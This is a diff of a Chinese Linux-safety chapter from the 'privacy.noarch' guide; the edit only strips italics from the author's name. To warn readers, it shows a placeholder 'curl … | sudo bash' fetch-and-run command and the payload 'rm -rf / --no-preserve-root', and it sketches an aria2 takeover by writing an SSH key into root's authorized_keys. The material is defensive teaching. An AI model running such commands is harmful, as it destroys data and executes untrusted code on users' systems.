@@ -9,7 +9,7 @@ $ curl https://lorem.ipsum/dolor.sh | sudo bash
 
 上面的一行命令，你看着熟悉吗？
 
-*noarch* 现在告诉你，这个你将要运行的 `dolor.sh` 内容是这样的：
+noarch 现在告诉你，这个你将要运行的 `dolor.sh` 内容是这样的：
 
 ```
 rm -rf / --no-preserve-root
@@ -19,12 +19,12 @@ rm -rf / --no-preserve-root
 
 这类操作系统自由度极高，但也代表着人为损坏的门槛更低；因此你需要在使用时多加注意。
 
-下面是 *noarch* 在数年 GNU/Linux 使用过程中总结出的 do's & don'ts.
+下面是 noarch 在数年 GNU/Linux 使用过程中总结出的 do's & don'ts.
 
 
 ## *不：* 运行未知脚本
 
-我们再来看下开头 *noarch* 提到的命令：
+我们再来看下开头 noarch 提到的命令：
 
 ```
 $ curl https://lorem.ipsum/dolor.sh | sudo bash
@@ -34,13 +34,13 @@ $ curl https://lorem.ipsum/dolor.sh | sudo bash
 
 你可能会问，*那我是不是就不要运行脚本了？*
 
-当然不是。前提是你*在运行脚本之前了解自己在运行些什么。* *noarch* 取这个使用管道符号运行脚本的例子，还强调审核脚本的重要性。
+当然不是。前提是你*在运行脚本之前了解自己在运行些什么。* noarch 取这个使用管道符号运行脚本的例子，还强调审核脚本的重要性。
 
-*noarch* 建议你在运行任何脚本之前，先下载下来粗略阅读一遍，然后再给它可执行权限运行。这样你至少知道自己在运行什么。
+noarch 建议你在运行任何脚本之前，先下载下来粗略阅读一遍，然后再给它可执行权限运行。这样你至少知道自己在运行什么。
 
 ### 你真的需要一键脚本吗？
 
-*noarch* 的个人意见：*使用他人的一键脚本，可视化面板等不是学习 Unix 的好方法。*
+noarch 的个人意见：*使用他人的一键脚本，可视化面板等不是学习 Unix 的好方法。*
 
 脚本没法覆盖所有使用情况，不知道目标机器的硬件配置，因此往往只能取一个“刚好能运行”的配置。
 
@@ -126,7 +126,7 @@ Gzip 配置得当[能帮你省下超过 70% 的流量](https://www.rootusers.com
 
 ### 别无选择？
 
-有意思的是，*noarch* 上面讲到的“野包”之一就是安全运行野包的一个方法。
+有意思的是，noarch 上面讲到的“野包”之一就是安全运行野包的一个方法。
 
 你可以使用 Podman 或 Docker 运行一个发行版容器，然后在容器里安装野包。任务完成后，把容器删除即可。如果你需要更多安全性，虚拟机也是一个好主意。
 
@@ -150,7 +150,7 @@ Gzip 配置得当[能帮你省下超过 70% 的流量](https://www.rootusers.com
 
 ### *不：* `root` 运行服务
 
-*noarch* 再举一个例子：你使用 [aria2](https://aria2.github.io/) 搭建了一个下载机。
+noarch 再举一个例子：你使用 [aria2](https://aria2.github.io/) 搭建了一个下载机。
 
 你对安全并非完全不重视，使用了 ssh key 登录，并且限制了可以访问 ssh 的 IP 地址。
 
@@ -158,7 +158,7 @@ Gzip 配置得当[能帮你省下超过 70% 的流量](https://www.rootusers.com
 
 在不利用任何 0day 的情况下，攻击者只需要找出你的 aria2 RPC 密钥（你为了方便，它多半是一个弱密码），然后下载他的 ssh 公钥到 `/root/.ssh/authorized_keys`, 这台机器就是他的了。
 
-*noarch* 推荐的使用方法是为 `aria2c` 创建一个专门，低权限的用户，然后将它以这个用户运行；你还可以为它创建一个 `systemd` 服务，指定运行时的用户和组，或者使用 `systemd` 的[动态用户](https://www.freedesktop.org/software/systemd/man/systemd.exec.html#DynamicUser=)功能。
+noarch 推荐的使用方法是为 `aria2c` 创建一个专门，低权限的用户，然后将它以这个用户运行；你还可以为它创建一个 `systemd` 服务，指定运行时的用户和组，或者使用 `systemd` 的[动态用户](https://www.freedesktop.org/software/systemd/man/systemd.exec.html#DynamicUser=)功能。
 
 ### *不：* `nobody` 运行服务
 
@@ -166,7 +166,7 @@ Gzip 配置得当[能帮你省下超过 70% 的流量](https://www.rootusers.com
 
 你可能觉得，系统里最低权限的用户是 `nobody`, 也确实有很多教程叫你把服务在 `nobody` 下运行。*那么以后低权限的进程都用 `nobody`?*
 
-很抱歉，这是一个误导。*noarch* 在[本章第一版](https://github.com/noarchwastaken/privacy/commit/707dfe884294a2667008c10359704264ba126e0a)时也犯了这个错误。
+很抱歉，这是一个误导。noarch 在[本章第一版](https://github.com/noarchwastaken/privacy/commit/707dfe884294a2667008c10359704264ba126e0a)时也犯了这个错误。
 
 使用 `nobody` 运行服务，会使你的服务意外获得其它在 `nobody` 下的资源。`nobody` 还被 Linux 内核[用来映射无法映射到当前命名空间内的 UID](https://fedoraproject.org/wiki/Changes/RenameNobodyUser), 例如 NFS 使用的 32 位 UID.
 
@@ -179,7 +179,7 @@ Gzip 配置得当[能帮你省下超过 70% 的流量](https://www.rootusers.com
 
 刚看完上一节[不安装野包](#不-安装野包)，你应该意识到上图的行为像是自杀。它将 `rpm` 包强行安装在基于 Debian 的发行版上，后果可想而知...
 
-包括 *noarch* 在内，互联网上的教程编者也经常犯错误，或者无法及时更新他们的教程。（就看上一节[不 `nobody` 运行服务]()！）
+包括 noarch 在内，互联网上的教程编者也经常犯错误，或者无法及时更新他们的教程。（就看上一节[不 `nobody` 运行服务]()！）
 
 盲目跟随这些教程可能使你陷入死胡同，使用一个已经被抛弃的配置，例如在 Nginx 上启用 SSLv3. （永远别尝试在生产环境上这么做！）
 
@@ -190,9 +190,9 @@ Gzip 配置得当[能帮你省下超过 70% 的流量](https://www.rootusers.com
 
 说起 man pages, 它是学习类 Unix 系统的最好方法：软件的官方文档通常就被打包为 man pages - 文档页。
 
-例如，*noarch* 要为自己搭建一个 `cgit` 可视化，而我不知道如何配置 `cgitrc` (`cgit` 的配置文件)。
+例如，noarch 要为自己搭建一个 `cgit` 可视化，而我不知道如何配置 `cgitrc` (`cgit` 的配置文件)。
 
-这时 *noarch* 只需要运行 `man cgitrc`, 这个由 `cgit` 开发者写的文档内就告诉了 *noarch* 这个配置文件的格式，配置项以及它们的用途。比网上某个教程可靠得多！
+这时 noarch 只需要运行 `man cgitrc`, 这个由 `cgit` 开发者写的文档内就告诉了 noarch 这个配置文件的格式，配置项以及它们的用途。比网上某个教程可靠得多！
 
 阅读 man pages 可能比盲目跟随网上教程耗时长，但它绝对能给你省下后续解决问题的时间。
 
@@ -201,11 +201,11 @@ Gzip 配置得当[能帮你省下超过 70% 的流量](https://www.rootusers.com
 
 ## *最好：* 定期备份
 
-如果你在 `privacy.noarch` 的 [Telegram 群](https://privacy.n0ar.ch/chat)内活跃，你应该知道 *noarch* 使用 [Btrfs](https://btrfs.wiki.kernel.org/index.php/Main_Page).
+如果你在 `privacy.noarch` 的 [Telegram 群](https://privacy.n0ar.ch/chat)内活跃，你应该知道 noarch 使用 [Btrfs](https://btrfs.wiki.kernel.org/index.php/Main_Page).
 
-Btrfs 的[写入时复制](https://en.wikipedia.org/wiki/Copy-on-write)特性为 *noarch* 的日常备份带来了极大便利；并且它也多次在 *noarch* 搞坏系统时拉了我一把。
+Btrfs 的[写入时复制](https://en.wikipedia.org/wiki/Copy-on-write)特性为 noarch 的日常备份带来了极大便利；并且它也多次在 noarch 搞坏系统时拉了我一把。
 
-别急着转换文件系统到 Btrfs; *noarch* 想要传达的信息是，时常备份系统能在你玩脱时把你救回来。
+别急着转换文件系统到 Btrfs; noarch 想要传达的信息是，时常备份系统能在你玩脱时把你救回来。
 
 无论是云服务器提供商的“快照”功能，还是简单地复制 `home` 目录，保留对你而言重要的数据是“不玩脱”重要的一环。
 
@@ -214,7 +214,7 @@ Btrfs 的[写入时复制](https://en.wikipedia.org/wiki/Copy-on-write)特性为
 
 运行着 GNU/Linux, 却还在寻找运行 Microsoft Office, Adobe Photoshop, Discord 等专有软件的方法？
 
-这可能是现在的你，这也是曾经的 *noarch*.
+这可能是现在的你，这也是曾经的 noarch.
 
 在 GNU/Linux 或 *BSD 上运行专有软件，专有软件会将你作为“二等公民”对待。
 
@@ -231,7 +231,7 @@ Btrfs 的[写入时复制](https://en.wikipedia.org/wiki/Copy-on-write)特性为
 
 ## 多问问题，问好问题
 
-虽然作为一个 ~~内向的作曲家~~，但是 *noarch* 依然想在最后说：**请利用好社区资源。**
+虽然作为一个 ~~内向的作曲家~~，但是 noarch 依然想在最后说：**请利用好社区资源。**
 
 GNU/Linux 和 *BSD 由数千个组件构成，当你遇到问题时，请弄清楚是哪个组件引发了你的问题；
 
@@ -239,13 +239,13 @@ GNU/Linux 和 *BSD 由数千个组件构成，当你遇到问题时，请弄清�
 
 在你找出出问题的组件之后，请去它们对应的 bug tracker 搜索；因为如果你的问题确实由一个最近出现的 bug 引起，搜索引擎没法及时索引 bug tracker.
 
-例如 *noarch* 在 Linux 5.7 发布时遇到了[一个巨大的 bug](https://bugzilla.kernel.org/show_bug.cgi?id=207383), 它影响了所有 Polaris 11 架构的 AMD 显卡，包括 *noarch* 的 RX580 在内，使得 Linux 内核在运行几分钟到几十分钟不等时 panic.
+例如 noarch 在 Linux 5.7 发布时遇到了[一个巨大的 bug](https://bugzilla.kernel.org/show_bug.cgi?id=207383), 它影响了所有 Polaris 11 架构的 AMD 显卡，包括 noarch 的 RX580 在内，使得 Linux 内核在运行几分钟到几十分钟不等时 panic.
 
-*noarch* 在搜索引擎搜索无果，自己编译内核无果，后来才在 Linux kernel bugzilla 找到了这个问题。虽然没有参与测试，但 *noarch* 也得到了解决方案：将内核降级。幸运的是，降级到 Linux 5.6 之后，这个问题就消失了。
+noarch 在搜索引擎搜索无果，自己编译内核无果，后来才在 Linux kernel bugzilla 找到了这个问题。虽然没有参与测试，但 noarch 也得到了解决方案：将内核降级。幸运的是，降级到 Linux 5.6 之后，这个问题就消失了。
 
 如果你对问问题有更多的疑惑，可以参考[提问的智慧](https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md)，它围绕 Hacker 社区的传统，详细讲解了如何问关于软件的问题。
 
 
 ---
 
-如果你发现 *noarch* 在本章漏了哪些重要内容，请别犹豫，[问 *noarch*](https://t.me/noarchwastaken) 或者为 `privacy.noarch` [加上你想要的内容](https://github.com/noarchwastaken/privacy/pulls)。
+如果你发现 noarch 在本章漏了哪些重要内容，请别犹豫，[问 noarch](https://t.me/noarchwastaken) 或者为 `privacy.noarch` [加上你想要的内容](https://github.com/noarchwastaken/privacy/pulls)。
